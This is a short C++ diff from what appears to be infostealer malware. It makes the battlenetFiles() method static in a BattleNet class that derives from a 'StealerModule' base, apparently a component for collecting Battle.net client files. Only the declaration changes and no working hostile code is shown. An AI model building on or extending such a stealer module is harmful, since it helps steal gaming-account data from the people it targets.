@@ -12,7 +12,7 @@ class BattleNet : public StealerModule {
 public:
     void execute(fs::path &root) override;
 private:
-    std::vector<fs::path> battlenetFiles();
+    static std::vector<fs::path> battlenetFiles();
 };
 
 
